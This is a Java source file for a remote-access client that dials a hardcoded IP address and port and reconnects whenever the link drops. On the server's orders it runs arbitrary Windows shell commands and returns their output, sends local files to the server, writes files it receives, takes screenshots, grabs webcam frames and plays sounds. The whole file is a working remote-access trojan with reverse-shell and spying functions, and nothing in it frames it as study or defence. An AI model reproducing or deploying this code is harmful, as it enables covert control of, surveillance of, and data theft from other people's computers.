package clientTest;

import java.awt.AWTException;
import java.awt.HeadlessException;
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.net.Socket;
import java.nio.CharBuffer;
import java.text.SimpleDateFormat;
import java.util.Date;

import javax.imageio.ImageIO;
import javax.sound.sampled.AudioInputStream;
import javax.sound.sampled.AudioSystem;
import javax.sound.sampled.Clip;
import javax.sound.sampled.LineUnavailableException;
import javax.sound.sampled.UnsupportedAudioFileException;

import org.bytedeco.javacv.*;

import static org.bytedeco.javacpp.opencv_core.IplImage;
import static org.bytedeco.javacpp.opencv_core.cvFlip;
import static org.bytedeco.javacpp.opencv_imgcodecs.cvSaveImage;


public class client {
	
	static String ip = "89.40.116.15";
	static int port = 6655;
	
	static Socket client;
	static OutputStream outToServer;
	static InputStream inFromServer;
	static DataOutputStream out;
	static DataInputStream in;
	
	static Process cmd;

	public static void main(String[] args) {
		
		String command;
		
		connectToServer();
		
		System.out.println("Moving on...");
		
		try {
			cmd = new ProcessBuilder("cmd.exe").redirectErrorStream(true).start();
		} catch (IOException e1) {
			e1.printStackTrace();
		}
		
		while (true) {
			try {
				command = in.readUTF();
				System.out.println("Recieved: " + command);
			} catch (IOException e) {
				connectToServer();
				continue;
			}
			
			switch (command) {
			case "cmd":
				cmdCommand();
				break;
			case "receive":
				receiveFile();
				break;
			case "send":
				sendFile();
				break;
			case "screenshot":
				screenshot();
				break;
			case "webcam":
				webcam();
				break;
			case "sound":
				sound();
				break;
			case "exit":
				safeExit();
				break;
			}
		}
	}

	private static void sound() {
		String path;
		
		try {
			path = in.readUTF();
		} catch (IOException e) {
			connectToServer();
			return;
		}
		
		File soundFile = new File(path);
		
		Clip clip;
		try {
			clip = AudioSystem.getClip();
			AudioInputStream ais = AudioSystem.getAudioInputStream(soundFile);
			clip.open(ais);
			clip.start();
		} catch (LineUnavailableException | UnsupportedAudioFileException | IOException e) {
			e.printStackTrace();
		}
		
		
	}

	private static void webcam() {

		FrameGrabber grabber = new VideoInputFrameGrabber(0);
		OpenCVFrameConverter.ToIplImage converter = new OpenCVFrameConverter.ToIplImage();
		IplImage img;
		int i = 0;
		try {
            grabber.start();
 
            Frame frame = grabber.grab();

            img = converter.convert(frame);

            //the grabbed frame will be flipped, re-flip to make it right
            cvFlip(img, img, 1);// l-r = 90_degrees_steps_anti_clockwise

            //save
            cvSaveImage((i++) + "-aa.jpg", img);

       
            grabber.close();
           
        } catch (Exception e) {
            e.printStackTrace();
        }
		
		
		
		
	}

	private static void screenshot() {
		// Save current DateTime
		Date date = new Date();
		
		// Create format
		SimpleDateFormat ft = new SimpleDateFormat ("MMddhhmm");
		
		// Take screenshot and save with formatted DateTime as filename
		try {
			BufferedImage image = new Robot().createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));
			ImageIO.write(image, "png", new File(ft.format(date)));
		} catch (IOException | HeadlessException | AWTException e) {
			e.printStackTrace();
		}
		
	}

	private static void sendFile() {
		
		String fPath;
		
		try {
			fPath = in.readUTF();
		} catch (IOException e1) {
			connectToServer();
			return;
		}
		
		File file;
		FileInputStream fis;
		int fileLen = 0;

		try {
			file = new File(fPath);
			fis = new FileInputStream(file);
			fileLen = (int) file.length();
		} catch (FileNotFoundException e) {
			e.printStackTrace();
			return;
		}
		
		

		byte[] buffer = new byte[fileLen];

		try {
			out.writeInt(fileLen);
			while (fis.read(buffer) > 0)
				out.write(buffer);
			fis.close();
		} catch (IOException e) {
			e.printStackTrace();
			connectToServer();
			return;
		}
		
		
	}

	private static void receiveFile() {
		int fileLen = 0;
		try {
			fileLen = in.readInt();
		} catch (IOException e) {
			connectToServer();
			return;
		}
		
		FileOutputStream fos;
		
		try {
			fos = new FileOutputStream(String.valueOf(fileLen));
		} catch (FileNotFoundException e) {
			e.printStackTrace();
			return;
		}
		
		int read = 0, remaining = fileLen;
		byte[] buffer = new byte[4096];
		
		try {
			while((read = in.read(buffer, 0, Math.min(buffer.length, remaining))) > 0) {
				remaining -= read;
				fos.write(buffer, 0, read);
			}
			fos.close();
		} catch (IOException e) {
			System.out.println("Error while receiving and writing file!");
			connectToServer();
			e.printStackTrace();
			return;
		}
		
		System.out.println("File recieved!");
		
	}

	private static void cmdCommand() {	
		
		String command;
		
		try {
			command = in.readUTF();
		} catch (IOException e) {
			connectToServer();
			return;
		}
		
		System.out.println("Command " + command + " recieved");
		
		BufferedWriter cmdIn = new BufferedWriter(new OutputStreamWriter(cmd.getOutputStream()));
		
		try {
			cmdIn.write(command);
			cmdIn.newLine();
			cmdIn.flush();
		} catch (IOException e1) {
			e1.printStackTrace();
		}
		
		System.out.println("Command executed");
		
		String cmdOutput = "";
		CharBuffer cb = CharBuffer.allocate(10000);
		BufferedReader cmdStream = new BufferedReader(new InputStreamReader(cmd.getInputStream()));
		
		try {
			Thread.sleep(1000);
			boolean read = true;
			while (read) {				
				if ( cmdStream.ready()) {					
					if (cmdStream.read(cb) < 10000) read = false; 					
					cb.flip();				
					cmdOutput += cb.toString();
					if (cb.toString() == null) break;
				} else break;
			}
		} catch (IOException | InterruptedException e) {
		}
		
		System.out.println("Output read");
		
		try {
			out.writeUTF(cmdOutput);
		} catch (IOException e) {
			connectToServer();
			return;
		}
	}

	private static void connectToServer() {

		boolean connected = false;
		
		if (client != null)
			try {
				client.close();
			} catch (IOException e1) {}
		
		while (!connected) {
			try {
				Thread.sleep(1000);
				System.out.println("Connecting to Server...");
				client = new Socket(ip, port);
				outToServer = client.getOutputStream();
				inFromServer = client.getInputStream();
				out = new DataOutputStream(outToServer);
				in = new DataInputStream(inFromServer);
				connected = true;
			} catch (IOException | InterruptedException e) {
				connected = false;
				System.out.println("Connection failed...");
			}
		}
		System.out.println("Connected!");
	}
	
	private static void safeExit() {
		try {
			client.close();
			outToServer.close();
			inFromServer.close();
			out.close();
			in.close();
		} catch (IOException e) {}
		
		System.exit(0);
	}
}
